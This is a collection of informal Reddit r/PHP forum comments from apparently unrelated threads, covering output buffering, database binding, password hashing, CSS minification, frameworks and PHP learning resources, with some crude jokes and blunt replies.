At least not in this instance. I've used output buffering once, but now I don't remember why. I think it was when I didn't have write access to a file/database, but wanted to change something before outputting it. EDIT: Remembered. I had a script that would always run long, slowly outputting info so I buffered it and sent it all at the end.
The search returns all the nodes it finds, with accessStatment and corresponding node content so that user can pick the right statement to use to access the node. I also think specifying the complete statement as opposed to stripping node tags out is better for readability reasons. Even if it is longer, it provides information about the nodes namespace and its parents. Also you can just copy paste the statement from the result of search to your editor. So I don't think it is much trouble to use complete statement. Other functions does not use this output. It would not make sense if it were so.
The real problem here is $post. Either it isn't being initialized the way you want it to, or it doesn't contain any image tags.
Benefits over [QueryPath](http://querypath.org/)?
First and foremost, you need to ask yourself if you *really* need the bloat that comes with a plugin architecture. If you're the only person who's actually going to be using and modifying your code, if it's relatively single-purpose, then there's really no reason to go down this alley if you don't have to. Now, if you're really sure you want to do this, you just have to make sure that your mediator has access to everything it needs. You could pass in absolutely every variable that the code needs to modify, but that would be clunky. A more-better solution would be to have all of your properties wrapped in a domain-based handler that knows how to add/remove/delete points, and hand that to the plugin. Or use a Factory and then you don't have to hand anything to it. This will only cause a problem if your underlying business logic isn't made aware of the changed state as a result of the plugin - it has to remember to grab a new copy of the data (or use a singleton).
I am sorry. I never heard of QueryPath. I have checked the link, and from its source it seems much better library than mine. :). 
You're not checking preg_match_all to make sure you actually found something. Look up the documentation for preg_match_all.
There's your problem...wordpress.
Unit tests are the best form of documentation for your code. If I want to judge the quality of the code, one of the best clues are in how clean and concise the testing is. Code that's easy to test is usually well-structured and well-encapsulated.
Looks promising. Bookmarked.
If you had some external code that wrote to the output stream that you wanted to capture, then you would need to use output buffering. 
&gt;I don't see this as being a big deal, who doesn't build their PHP from sources? FTFY
Any good tips on where I could find good tutorials and such? that might not be obvious at first glance via google? :) Thanks for sharing! :)
WIth htaccess, this should work: [IfModule mod_rewrite.c] RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)/$ http://www.yadayada.com/$1 [R=301,L] [/IfModule] edit: Changed the '&lt;' '&gt;' to '[' and ']' for formatting. Change back before going live.
I'm guessing register_globals is turned off.
I don't know why anyones saying this. It seems really easy. Change line 7 to $first_img = (isset($matches [1] [0])) ? $matches [1] [0] :' ';
Took a few days for the post to show up on Reddit :( 
You can also cut down these lines of code: if (empty($first_img)){ $prefix = ""; $first_img = ""; $suffix = ""; } return $prefix . $first_img . $suffix; } to this: return (empty($first_img)) ? NULL : $prefix . $first_img . $suffix; It's basically saying "OK, I'm about to return something, but is `$first_img` empty? Yes? Ok, then actually I won't return anything. No? Ok, I'll return the variables in `$prefix`, `$first_img`, `$suffix`."
I actually find sprintfs much easier to read than string concatenation 
You're probably the only one - I'm guessing you came from C?
I do too, but I guess that's because I originally did not start with PHP
That is called URL rewriting. You need to sit down with a book that covers MVC. You really are doing it all wrong. Servers can handle a ton of load. Some SQL servers do 10s of thousands of queries a second. How do you think reddit works? Lots of static html pages? This isn't 3d rendering. Its text. Modern servers have tons of power to spare.
I typically recommend using PHPUnit to facilitate testing. The documentation for PHPUnit itself does a decent job of explaining the basics of Unit testing. http://www.phpunit.de/manual/current/en/automating-tests.html
The issue tracker is notably missing, sadly. I was hoping they'd have moved away from bugs.php.net.
Wow, thank you so much. I'm finally getting a connection to the db, although it's denying me access. &gt;Disconsolate@webserver:~# mysql -h webhostingdb-c1n0 -u {db-username} -p{db-password} When I use this, do I have to put the { } with my db user and pass? When I type that command it asks me for a password, I retype it and I get access denied for '{user}'. 
I like the github issue tracker as much as the next guy, but for a project the size of PHP, it would be completely useless. You need more metadata and facets, like in bugs.php.net.
Your link seems to be temporarily offline so I can't read the article but mediator seems like a bit of a weird pattern to use for a plugin system. Generally mediator is good for controlling how two specific parts of a system work together. This is really useful at boundaries where you have two systems that need to know about one another but are still expected to remain decoupled in case one or the other must be replaced. Now this sort of sounds like a plugin system but the crucial difference IMO is that a system shouldn't know anything at all about it's plugins. This is why people tend to use patterns like observer because you just attach them and the thing being observed really has no idea what's going on. It just keeps sending out notifications regardless of if a plugin is looking for them or not. Either way I'll try and read the article when it's back up and it might change my mind.
you can obviously look at W3C schools for some info but other then that i would highly recommend [this guys video series](http://www.youtube.com/playlist?list=PL67D94BE42620925B&amp;feature=plcp)
But PHP is already forked to hell. *rimshot* Thank you, thank you. I'll be here all week.
Thanks! I'll keep those IRC channels in mind if I run into more problems. 
Thanks for taking the time to explain that in detail. There is a port-forwarding option in putty that I'll have to mess around with at some point. It won't save my forwards for some reason, but as you said I'm guessing there some form of config where I can manually put them in. 
Are you connecting to the server by IP address or name?
Drop Suhosin, Ubuntu already has AppArmor. Just run php-fpm under a separate user and secure both httpd and php-fpm with AppArmor.
30 seconds sounds wrong. I know there was a bug in Windows' version of the mysqlnd in 5.3.something. I would try running the latest version and see if you still have that issue. I am using 5.3.9 on my dev box at home and have no issues with it.
Much of PHP is also going to OOP. Google search will show you many free and paid tutorials. I would say that if you want to build PAGES (as in more that one) you'll want to at least think about DRY. Zend (makers of PHP) have a framework, and tutorials and training if you go that route. Also, tear apart other PHP things and bend them to your will. The other videos recommended by opn420 seem more procedural, and I am not knocking that, I am just suggesting that that isn't the end of the language. Just another view point. 
Yes, but in this case there was nothing between the function calls.
i love thenewboston's channel. really good for a beginner in whatever the field he is tutorial-ing in.
Hg mirror you linked seems exactly the same to &lt;http://git.php.net/&gt;. Is it correct?
thanks and yes basicly I just want to capture input from forms and also how to have users and display certain content only for them. I basicly thought that was the only thing php was used for, not building the site.
Thanks, I found thenewboston.org seems pretty good for beginners.
in_array ?
I wouldn't combine all of that concatenation with the ternary operator on your return line, that's definitely less readable. Maybe: $return_value = ""; if(!empty($first_img)) { $return_value = $prefix . $first_img . $suffix; } return $return_value;
do you realize how much I love you right now?...a lot, that's how much.
This. Also if you need the key returned (so you know where the value is) then use array_search **Manual Pages** * [in_array](http://php.net/manual/en/function.in-array.php) * [array_search](http://www.php.net/manual/en/function.array-search.php)
Happy I could help. :)
Well, this is nice, from what I've read on the PHP page I can search for an array within an array...thx for za help.
Damn it, I forgot to mention: I assume this works for multi dimensional arrays as well, but I also assume I have to specify the array to be searched, yes?
Good edit, but we should emphasize that you don't want to leave your password lying around your bash history like that. ;)
I'm just learning, too. Here are a few tips that I've learned so far. * PHP has to run on a server; if you don't have a server download xampp. xampp acts like a server for testing purposes. * if you want to do database stuff (e.g. access a table from a mySQL database) then you also need to download phpMyAdmin * [w3schools](http://w3schools.com/) has a decent intro to PHP that shows you how to read a mySQL database. * google things like, "how to create log in script in php" Happy coding! EDIT: Ok, so I know all the hate is directed towards w3schools and not lil' ole me. Just want to reiterate that I'm still a green thumb too. So I appreciate the advice to ignore w3schools 
A version with callback would be even more useful. Like [array_filter](http://www.php.net/manual/en/function.array-filter.php), only the function would stop at the first match and would return that. Of course, array_filter is also good enough, but it always checks all elements of the array even if you are interested only in the first match.
I learned the basics from looking at [Tizag](http://www.tizag.com/phpT/) Going through that is quite good. Like what NeroCobbaZilla mentioned in order for PHP to work you need it to work on a server. I suggest [WAMP](http://www.wampserver.com/en/) This comes with pretty much everything you need and is quite easy to configure. After that its just a matter of playing around with it. From what i see its syntax is similar to Javascript and C.
I guess it's just the issue of everyone releasing an article every few months saying 'This is the right way to do it because of these reasons, and I am right' and everyone saying 'Look! This is the newest article! This guy has *REASONS*.' I guess it really is a choice of style, the overhead PHP uses for all of this is minimal. I admit it, I was just trying to nitpick just to nitpick.
Nice eye. It looks like a temporary bug. All energy was put into the git move, with other tasks being secondary. Poor Mercurial.
I can't let this link stand! w3schools is full of mis-information. Not so much that it's noticable to people learning the stuff, but you might pick up on some bad/wrong habits along the way :( [if you want more info, go here](http://www.w3fools.com) I would suggest [php.net](http://php.net/manual/en/) or just about any other site than w3schools :) edit: forgot to mention [stack overflow :)](http://www.stackoverflow.com)
Wait, there are still people who use XML?
so xml is depreciated now?
php.net has a long-standing, content rich comment archive that covers tons of use cases and generally make visible any errors i the docs themselves. Mis-information exists on every site, but it's a lot harder to come by on php.net than on w3schools
PHP.net is about as complete as you can get.
[An active, large community able to help you if you have questions or problems along the way](http://www.phpfreaks.com/forums/)
Nope. Would you mind taking a look at the edit I just made? 
w3schools in an awful resource, you don't need phpMyAdmin to use mysql, and the results for "how to create log in script in php" in google will teach you how to create really poor login scripts in php.
[Here you go](http://net.tutsplus.com/tutorials/php/the-best-way-to-learn-php/)
 function give_me_your_dick_if_its_in_butts($butts, $dicks) { foreach($butts as $derp) { if ($derp == $dicks) { return $derp; } } } Not sure how useful that would be. It would always return `$dicks`, which I already have one of, and I don't swing that way. Obviously you could be using a hashed array/associative array's key as what you are searching for, but you might as well go fo something like: if (!empty($butts[$dicks])) { echo "I found dicks in butts!!"; } Performance wise, `give_me_your_dick_if_its_in_butts()` isn't bad, unless you're operating on a stupidly large array (fucking cakephp).
You can download Sentry for free and implement it into your code. There's no strings there. If you want a prebuilt scaffold or prebuild code to allow users to login using OAuth methods, you can buy those.
Easter egg.
That only tells if you an item exists in an array, which in no way answers the OP's question.
Down voted for not giving a shred of context.
The person running his code would need Zend Optimizer (Or Zend Guard Loader), which makes using Zend Guard a very poor choice.
I think this may very well be the answer. I've done stupid shit like this before when I was on a deadline and really needed to debug a situation that rarely every occurs. And after working for 8 hours straight, it's easy to forget to remove this kind of code.
Is this code part of a process that sleeps every second? This would be one way to (unreliably) make the process behave differently 1/60 of the time, as if it were doing something as if it were 8 hours earlier.
That's exactly what it does. Why required more context, but it makes absolutely no sense to me.
Definitely. Usually when someone asks about obfuscating their code, I simply say "No, no, no, you can't. Just stop."
Just don't do it.
how do you know it's not a DNS issue? The edit isn't really telling me all that much more.
you may have to add to that these two. Unit testing skills. Knowledge of any DVCS like mercurial or git. 
If you're familiar with the javascript library jquery, the way it's source code is "obscured" is that it's a solid block of text without spacing, line breaks, or comments (and it's really only done like that for file size considerations). Obviously still able to be read, but it's that much less manageable. You could do that as an "anti-theft" measure, but the other comments pretty much covered it: Zend (and all it's requisites) or don't do it.
[Possibly something like this?](http://www.hotscripts.com/listing/link-base-l-1-0/)
This is the feeling I get when I spend at least 30 minutes writing something without executing the code a single time and it works flawlessly. For me this is very rare. This guy/girl just seems to lead a miserable existence albeit with a flare for humor.
&gt;It sounds like you really haven't thought about the problem and you clearly haven't shared it. This is the first place I thought to share. I've had some problems with the other cases (6 cases in total) but they're all resolved. Mostly errors caused by new lines and ''''s in certain database results. I've found and sanitized ~~all~~ most of that, so now I'm wondering if it's just the massive size or that I've missed something and that's causing the problem. However if it is the latter problem I can't use my traditional method to find errors in the JS. This is why I came here to ask for help, see if anyone has a method to check JS for errors without copy pasting or a work around for the freezes. Oversimplified view of how the JS is generated: &lt;script type="text/javascript"&gt; &lt;?php echo $s_allTheCode; ?&gt; &lt;/script&gt;
Your problem is not javascript. Your problem is not PHP. Your problem is that you don't know what the fuck you are doing. Seriously. Dude. There is NO code generation there, you are merely emitting whatever code exists in $s_allTheCode. 200k+ lines suggests that you really need to sit down and look at the code that creates $s_allTheCode and think about what is going on. Are you over concatenating in a loop, for example -- multiplying the number of lines with each fields. You are jumping to the conclusion that you need to debug your Javascript when you clearly haven't even thought about how that code is being put together. Post complete code or GTFO. There is no tool in the universe that can compensate for your obvious cluelessness. BTW: Yes, this may sound trollish, but too bad. If debugging doesn't make you angry, you're doing it wrong. :) 
um, anyone wanna do a tl;dr om what this is about?
If someone is really determined there are ways of decrypting the code. There are programs to decrypt both Zend Guard and Ioncube. Either do a light version of your code or don't include it in the project (find an alternative on the web)
This. There's bound to be a selection of caching plugins for Wordpress.
We mainly do meatspace work, we actually only just started the web branch 2 years ago. ;) We've added four developers in that time, though.
Please let me know if it make sense....
WebSockets are a proposed way of transmitting data like you would in a standard client-server architecture. In an environment where everything but port 80 (http port) are closed off, this is a way of mimicking those types of connections. It still seems very niche as far as uses, especially in the business of web development, but could probably be useful for streaming data without the continued overhead of XHRs. It's also only recently compatible with a lot of browsers. IE10 is the first IE to support it. So for widespread web development it might be certifiably useless at this point.
Benefits and pay range?
Salary compensation is based on skill and experience. ;) Competitive, I'd say. The benefits are really, really nice - the usual medical, retirement, etc, with a few bells and whistles.
Looks interesting. I have a couple questions: * Any real world example sites using this? * What made you decide the world needed yet another open source php based cms/framework? Serious question. What makes this better than all the other options out there? 
Submit a resume and I'll be happy to discuss this with you at length. You understand, I'm sure, that I'm really not at liberty to give out all of the intimate details of how our company is run blindly over the internet. ;) I'll say this, though - titles aren't "hats" at our company, like in a lot of places. We're a relatively "flat" company in terms of structure, and we hire the best to do what they're best at. 
A response from a web server to a request is made up of 2 parts - the headers and the content. The header provide metadata information on the request (eg. request status, redirect, encoding, etc). The content is the file or content being served (be it an HTML file, JPG image, Flash file, Word document or whatever) Under normal operation, as soon as you try to send something that isn't a header out from PHP, this triggers the sending of the headers. Once the server has sent the headers, they cannot be modified or added to, because it's already serving the content. There are 2 solutions to this: 1) Move the header() / session_*() / whatever function is causing the issue above the start of the document. 2) Use output buffering - using output buffering you can wait until part of all of the document has been processed before you start sending the document (which triggers the sending of the headers). I'm not familiar with the Wordpress code, but you may want to check what Wordpress and the plugins you're using expect the output buffering settings to be.
Well, you could do it in the model, but for something like this, which is basically presentational, I would put the formatting function into a helper and then call it in the view with the raw data. This means you can use the same helper function for other time formatting within your app without having to do the same thing in every model. If you absolutely, definitely will not need this functionality elsewhere in the model, I would just create a function in the model to do this for you which can then be called in the views. eg public function timespan() { return clever_formatting_here( $this-&gt;datetime ); } Then, in your view, you can just call $user-&gt;timespan();
I agree, passing the real date to the view, and just using a helper to change it to a more readable format would be what I would do. This way you don't have to worry about what format the date is in for comparisons, because you will always know its going to be a "createdAt" date, instead of maybe a "how old" date for certain data and a "CreatedAt" date for other. This will save you a headache later when you want to congratulate the user on his birthday or something :)
There are better ways to achieve this. For instance, if you use a logger that you always call, with no if statement or any check on what environment you're running. For example, using [Monolog](https://github.com/Seldaek/monolog) would be like: $logger-&gt;info('Something special happened'); or $logger-&gt;debug('My var: ' . var_export($var, true)); You let $logger deal with knowing whether it should actually write anything or not. This encapsulates logging and debugging logic and keeps your code clean and neat, turning 3 lines (if, statement, closing curly brace) into a single line.
I am going to be looking into this. Thank you.
You should not generate that much javascript. It's too much for a browser to deal with. You need to find a better solution. However, there could be some logic errors in your code leading to too much javascript being generated. Nonetheless I believe you need a new solution.
Off-topic. Belongs on [/r/phphelp](/r/phphelp). Also -1 for zilch research attempts. [Covered ad nauseam](http://stackoverflow.com/questions/8028957/headers-already-sent-by-php).
I didn't understand the question to mean the field name would always be the same and that there would be one and only one datetime field in any given result set. This method will check the results and see which data is in a datetime format. Then modify it if it is. The more efficient method would be to use the pre-built time functions or perhaps a customized function within the database and return the desired format without PHP.
Almost certainly white-space at the end of one of your include files after the closing ?&gt; ProTip ... when you have a PHP file that is entirely php code, leave off the closing ?&gt;, and you'll never have this problem.
Your business's website, www.bcgtrans.com looks like a someone installed a generic open source CMS, and never bothered to change the default theme. It screams "plain generic wannabe." To make matters worse, your tag-line is "Innovation | Quality | Results." I would never work for technology business that sells it self as innovative, while having an uncreative website that looks like its from 2005. Further, page load times are insanely slow (I'm on a 20mbit connection.) I *highly doubt* your site is slow due to traffic, so either your code base is extremely unoptimized, or your "quality" is based on cheapo-hosting or a cheapo-connection to your data center. Ugh. This is the kind of job I would want to run far, far away from. It's probably entirely based on bureaucracy, not innovation at all.
Hey, I'm the developer of Analog and just saw your post. Thanks! :) Your querying and indexing examples should definitely be helpful to new Mongo users.
The real problem is nobody agrees on how to implement it, if they implement it at all. Websockets are not worth using right now as a result.
Thank you! I appreciate the info.
You will like [stackoverflow](http://www.stackoverflow.com)
Crypt also stores the salt as part of the hash so it doesn't have to be stored in a separate place. You use the existing hash as the salt when generating the comparison hash. [BlowfishPasswordEncoderBundle](https://github.com/elnur/ElnurBlowfishPasswordEncoderBundle/blob/master/Security/Encoder/BlowfishPasswordEncoder.php) is an example of this in action.
I picked one up at a sales pitch for Zend Server done by a sales rep for Zend. But a quick search shows at least one person selling them on Etsy.
I'm actually going further and Symfony-izing Kohana by splitting my models into DAOs and Domains. The further you go into separation of concerns, the easier it is to work with your codebase.
as someone who was in your position a few months ago, I would say low 50s, depending on your coding skills. if you work in San Francisco and live outside of it, commuting to work everyday(which isn't bad if you work in downtown SF) then that's plenty to live on. Even if you decide to live in the city(SF), then you will do just fine. I'd ask for high 40's or low 50s.
Ignore the code in the article and instead do: $salt = $2a$' . '08' . '$' . $random; $hash = crypt($password, $salt); Where `$random` is 22 random characters from the set: A-Za-z0-9=. The `08` is the difficulty factor, you can tune it depending on the speed of your server and how often you generate hashes. 8 worked for me.
If I had something lined up, I would. I'm developing a mobile marketing app with my cousin, and learning Django as we speak, so hopefully that'll add some weight to my resume if I ever apply anywhere else.
you can EASILY make twice that.
The irony here is that he's talking about security, yet he completely fails to escape all the data he puts in his query. People need to stop acting like security experts when they're not. It doesn't do anyone any good.
He praises MD2 as being secure while the wikipedia entry he links clearly states "MD2 is no longer considered secure". And then he discourages the use of MD5.
Yeah but £ vs $...
If, for whatever reason, I happened to unearth this fragment of information, I would be sure to bury it inside a vault deep in the hot bowels of the Earth so noone would ever have to see it again.
Only places I've seen them is at conferences, usually Zend booth.
Seriously keep doing this series. It is awesome and I'm learning so much!
We'd like to help, but... 1. You mention your data set in excel tables, and that their structure is beyond hope 2. You don't mention what that data *is*, or how you want it represented/modified, only that it has to be done in a CMS style web app. Unfortunately, you haven't included enough information for anyone to make an informed decision as to what's **best** for your needs. Possibly consider adding more context?
He's just being creative! Don't block his flow, man!
PhpMaker (http://www.hkvstore.com/phpmaker/) The code it's ugly (or it was when i last checked it), but it's what you want, pickup a data source, configure some things, and BAM, instantly you've got a CRUD for that table. 
I think the difference is that there's always someone in the PHP community who thinks this might be a good idea.
[This is the "official" shop, afaik](http://shop.cafepress.com/php) - it's linked to from php.net, under merchandise. I hold no responsibility for any derisive looks you receive for putting such a sticker on your laptop, maybe you should buy a "Ruby" one the same size to cover it up, for next year. ;)
true, but part of the benefit of phpass is that you can deploy it on any system that may not have all the necessary libs, or an old as hell php version and phpass will still work. 
This sounds like the area I was looking into, I'd seen CodeIgniter before but I guess didn't look into it enough. I guess the issue here is knowing the terminology that explains what I want to do. Perhaps CRUD is the word I'm looking for.
Thanks very much, you definitely answered. I think MY version of "easy" is a lot different to everyone elses. Learning a framework isn't an issue, I just wanted something that would nullify the reasoning Excel files are created in the first place - they are so quick to damn make.
Fat models. Skinny controllers. In other words, do it in the model. 
Really I'm trying to make things a bit easier on the designer. IMO, the designer should be able to move the "top sales widget" from one page to another without getting the programmer involved or learn how to edit enough code to move the top sales code from one controller to another. I still want code separated into models views and controllers, I just want the ability to invoke the triumvirate at the designer level without screwing up too many other things.
I agree with you when it comes to the PHP community. There are a lot of bad PHP programmers out there. I just disagree that PHP itself is a bad language. A lot of people claim PHP is such an awful language, but I don't think it's that bad. It's a combination of elitism and people misrepresenting their opinions of the community.
Thanks very much for the link, very interesting project. However I actually want to move away from the Excel files altogether, its simply what the users have evolved from their original "lists, using excel because of SUM()".
Can you recommend a place to find a good recruiter? I've talked to one or two and feel like they didn't really try to help. I have some experience in PHP, but I'm more of a general purpose / front-end developer, if that matters.
It's the ease of it which is appealing. Going online is a big distraction and rather time consuming compared to OP's imagined software (imagined because it may not exist but is a good idea if it doesn't)
Since we're all php developers, it's highly likely that we have a browser open. At which point you open a new tab(command t) and you type php.net/&lt;function name&gt;. If you're using chrome or Firefox you can setup search engine short cuts to make this process even easier. I don't see how a desktop application would make this process any simpler.
I just run YUI from the command line. It's really simple and allows me to more easily compress the CSS to a new filename each time (caching reasons). And you don't need to run PHP on the fly each time the stylesheet is requested (or add a bunch of PHP scaffolding).
I don't but I've been looking into similar products for a while now. I do a lot of this sort of thing at work. Take shitty processes from other departments and make them work on the web. I'm handed spreadsheets, access databases, hand entered pages etc and I design interfaces for them to enter that data online and then generate reports. Right now I'm using a less than ideal combination of VBulletin with the Custom Form addon to simply generate forms quickly which all go into the same table then I select out the forms ID that I need and pull the data which is all in a serialized array and preform whatever garbage I need to, to generate a report. It works and it's actually fairly quick but I don't like working with giant serialized arrays because it offers zero perks that come with using a real table with real fields that have real properties that I can index and preform complex operations on.
How much experience with PHP and databases do you have? This sounds like a relatively simple relational setup that could easily be imported into an appropriate schema on any OSS database out there (and they all would likely be more than sufficient for your needs, so pick which you are familiar with, ie: PostgreSQL, MySQL, etc...at your needs it doesn't really matter *which* you choose). The 'difficult' part (although, I would call that childs play, but it depends wholly on your experience level) would be creating the initial schema (tables) and writing the import scripts...this is why I asked how familiar you are with PHP and databases.
Sure, command line is great but actually, many servers (shared hosting) do not allow to install Java or access the console through PHP. It's a shame! Who needs to run the compressor every time a CSS file is requested? We don't. You should only compress a file when it's really needed: - If the uncompressed CSS file (test.css) is newer than the compressed one (test.min.css), compress it on the fly (PHP) and replace the contents of test.min.css with the new code. - We also use a cache busting system for assets to force caches to serve the new file. Thanks for your feeback! 
The frameworks look like the right way to go, what you say is right (though I was actually thinking of it vice versa database-&gt;PHP) Zurmo looks quite clean on the front end and so this might be the sort of solution I need if RedBean allows this kind of output fairly simply. I'm looking into it.
I meant the command line on my system, not the server. Then I upload the compressed CSS file. That way there is zero overhead, the server just sends the file. Not sure what you mean by "cache busting system" though. You can't force a cache update if the browser has the URL cached as it won't even check for a new file.
If you don't find one you like, [this place](http://www.stickergiant.com/custom_stickers/laptop_stickers.php) or any other custom printing service will help you out with whatever your needs are.
It's pointless to do that. PHP versions that are that old have security holes and you'll be hacked. No point in setting up a great password system on a computer that is easy to hack.
We use LESS but LESS uses either basic compression (remove whitespace only) or the YUI compressor. We'll release a web based GUI for the PHP port this week that supports LESS compilation before compression. Watch the repo to be notified! Thanks for your feedback!
Every time Symfony is mentioned, I spend a little more time reading the docs to see if it seems to be something I should be using. Now that I'm starting to get how it works, it's fairly simple, but a very different way of thinking about how to structure a website. At this point I don't see enough compelling reasons to switch existing projects that use other framework or template systems (I currently use Smarty, which is excellent). But next time I start a new project I'll probably give it a try. Smarty is more straight forward and has a richer template system with finer cache control, but Symfony seems to be on track to eventually become more popular and is a more all-encompassing framework, while Smarty only provides a template system (albeit a great one). Eventually I'll probably do some page loading speed comparisons and see if Symfony's features outweigh the amount of overhead that it adds.
&gt;Sure, css-compressor is a good option but it's prone to introduce bugs in your CSS. Such as?
Comparing Smarty and symfony 2 is comparing apples to pears. symfony is a full stack framework (though comprised of non-interconnected components), while Smarty is just a templating engine. Smarty is more aptly compared to Twig, the templating engine used in symfony 2, which can easily be used outside of symfony. I use it all the time, especially with the Slim framework.
Not everyone has their choice of PHP version. If your access is limited to FTP files on a shared host you have to work with that. Because a host might have an older version of PHP (or not have _your_ required libraries installed) isn't an excuse to leave your customers passwords vulnerable.
There could be many! That's why it offers 4 *safety modes*: **Safe: (99% safe)** Safe mode does zero combinations or organizing. It's the best mode if you use a lot of hacks. **Sane: (90% safe)** Sane mode does most combinations(multiple long hand notations to single shorthand), but still keeps most declarations in their place. **Small: (65% safe)** Small mode reorganizes the whole sheet, combines as much as it can, and will break most comment hacks. **Full: (64% safe)** Full mode does everything small does, but also converts hex codes to their short color name alternatives. On the other hand, YUI compressor is always 99.9% safe!
Can't technically answer for the OP, but Xcache and APC are both memory-based. OP could prefer memory over filesystem (and I'd agree in the general case). memcached is an external thing that needs to be set up and often you just can't bother. APC is also far more often available than most alternatives, so they could be just trying to hit the biggest number of potential users with the smallest number of APIs to integrate with.
I think Drupal 9 is probably what most people want Drupal 8 to be - by then all developers should be switched over to the new way of doing things, and new developers won't have to have this transition period to work with. I got into major Drupal development just as 7 was coming out, and it was a pain finding compatible modules and good tutorials. &gt; That's a lot more than you can say about WordPress or Joomla developers. FSM, don't even get me started on them. I very much dislike Joomla's codebase for a number of reasons. 
The problem with this is that most tutorials and simple examples used for teaching cover just the bare functionality and do not touch on all the ins and outs of security. If you are going to be handling users then you probably want to do that securely. You might want to consider just installing a php based cms and learning how to use that.
php.net use to have a very nice help file that I use to use all the time but it fell out of favor and was never updated :( EDIT: There is a windows gadget [here](http://www.ziplineinteractive.com/php-function-finder-gadget/) it was designed for vista but still works in windows 7, rename .zip to .gadget. Honestly it could have been done better it's nothing more than a text box to query php.net
I'm on a mac?
I just did it on my mac and it worked fine.
I don't use the drawer thing - Also the reason I suggested Opera - few people use opera. The OP wanted a "stand alone" application. This created an application that you'd only use for php documentation. You're using my default browser as the application. Which for some reason the OP has already ruled out as "not efficient"
See also [https://wiki.php.net/internals/references](https://wiki.php.net/internals/references)
I press ALT+TAB, to switch to Chrome, Press CTRL+T to open a new tab, type php.net/[function name], and press enter. Works on Windows, Linux, and Mac.
Your comment does not make any sense. Symfony2 is framework. The Symfony's templating system is Twig. Smarty is a templating system. What is the point comparing Symfony and Smarty?
I don't think RoR is the only web framework in Ruby, as Django is not the only web framework in Python. ASP.NET is a different beast and I stopped using it before its MVC so I don't know (I liked C# and VS though).
C# MVC is so much better than the old way. You structure your classes based on actions and can route to different ones based on the HTTP verb being used. It makes much more sense and is cleaner than webforms, or whatever the traditional way was called. 
Generally speaking, I think the best practice is the one that will actually be used. A coworker and I may disagree how to best organize our code or the best workflow for version control, but if it means everyone is on board then I will gladly drop my case and go with someone else's suggestion.
I haven't actually used mysqli, but there is [this helpful thread](http://www.php.net/manual/en/mysqli-stmt.bind-param.php#104073), recommending to use reflection on your object to pass an array easily. Of note: $db = new mysqli("localhost","root","","tests"); $res = $db-&gt;prepare("INSERT INTO test SET foo=?,bar=?"); $refArr = array("si","hello",42); $ref = new ReflectionClass('mysqli_stmt'); $method = $ref-&gt;getMethod("bind_param"); $method-&gt;invokeArgs($res,$refArr); $res-&gt;execute(); 
I fail to see how your example is much different then what you can do with PDO: # the data we want to insert $data = array( 'name' =&gt; 'Cathy', 'addr' =&gt; '9 Dark and Twisty', 'city' =&gt; 'Cardiff' ); # and away we go ... $STH = $DBH-&gt;prepare("INSERT INTO folks (name, addr, city) values (:name, :addr, :city)"); $STH-&gt;execute($data); You can also use unnamed placeholders: $data = array('Cathy', '9 Dark and Twisty', 'Cardiff'); $STH = $DBH-&gt;prepare('INSERT INTO folks (name, addr, city) values (?,?,?)'); $STH-&gt;execute($data); Plus you now have a prepared statement handle ($STH) and if you need to insert multiple rows you just continue to call execute() with different $data
There really is absolutely no reason to have this inside php. Aside from just making it slower, it's nothing you'd want to do at runtime on your site. This is best done at deployment time, where you can just use the YUI binary. If you're not using a deployment system, it's time to start.
You could say it's a comparison of using Symfony vs. not using a framework. But using a template system (whether it's Smarty or Twig) does make for a very different development process and application model than using nothing at all, even if a template system isn't technically a framework.
And, in fact most Linux distros require you to use this `call_user_func_arry` hack since there is likely no support for the newer `mysqlnd` driver for the foreseeable future in any distro I've ever encountered. Thus, the easier [get_result()](http://www.php.net/manual/en/mysqli-stmt.get-result.php) method of `mysql_stmt` class is out of your reach. I suggest everyone open bug report tickets for your distro to get this fixed asap, and don't give up until it's solved. //i'm still bitter, Linux is 10 years behind here
Oh no, sorry. That one is similar to the one Zend gave out so I just associated the two. Even the ones on Zazzle are a bit rough.
If you have too many dicks in your butt, use a binary search for the correct one? This assumes you have an entire tree of dicks up there. 
It's probably easier just to use PDO.
I don't think you understood his question, or you don't understand how mysqli works. For whatever reason he wants to use mysqli. Mysqli does not let you pass an array of values to the mysqli_stmt::execute() method like you've shown in your example. More importantly, all the values you want to bind to the statement must be done with a *single call* to mysqli_stmt::bind_param(), which takes a variable number arguments rather than an array. There's no way to take his array of column values and bind them to a statement created with mysqli::prepare().
Not to mention that at that point, you're no longer so coupled to MySQL. Granted, you'll have to update some of your SQL statements, but at least your PHP code will remain almost untouched when you decide to switch to something different.
This is magical. I can't wait to try it out.
maybe, but I'm getting the impression questions should be directed to learnprogramming or phphelp. function minutes_to_hhmm($m){ $hh = floor($m/60); $mm = floor($m%60); $hh = $hh &gt; 9 ? $hh : '0'.$hh .":"; $mm = $mm &gt; 9 ? $mm : '0'.$mm; return $hh.":".$mm; }
There are many reasons, it is just not something most of us would benefit from. Here is one example, if you already have a caching system or a CDN in play you can deploy your CSS instantly without minifying it first. If you are making frequent changes to your CSS this speeds up deployment.
Perhaps...I think I've seen, when using xdebug, the ability to inspect current scope variables and an "edit" button hanging around -- however, I've never tried it. As for running a script outputting, say, a web page to Apache while dumping text to a file, sure. Any logging system will do that, or just file_put_contents in append mode.
"OO" != "standard thinking"; I don't see how refactoring a system is a proof that a mindset is being changed. D7 feels like D6 with extra UI candy and extra bugs. Working with it has it's advantages but it's still just doing it the drupal way and that's it.
No you can not do this with NetBeans, I think it is an issue with xdebug. You CAN do this with PhpED (http://www.nusphere.com/products/phped.htm?gclid=CI_bxrXV_K4CFcgntAoddFoR4A) I've used both IDEs for about 2 years each. I can't decide which I like best, PhpEd is lovely, but the browser debug toolbar sucks ass and searching the source code sucks ass. NetBeans is rubbish at debugging your code.
 function minutes_to_hhmm($minutes) { return sprintf('%02u:%02u', floor($minutes / 60), floor($minutes % 60)); }
I still disagree with your first point - you should be trapping and handling your errors directly. If that intentionally results in a 500 result, that's fine - but you should probably consider doing something a bit friendlier than that, at least a 404 in the case of a missing controller. throwing a header and die()ing is about the least elegant way of handling errors that one can possibly use.
I don't agree. For me D7 is a vast improvement over D6. The new OO stuff (EntityFieldQuery!!) is really nice to work with, and the fact that you can use PDO for your queries makes me never want to look back at D6.
This is built into Eclipse (and I'm sure any other decent IDE as well).
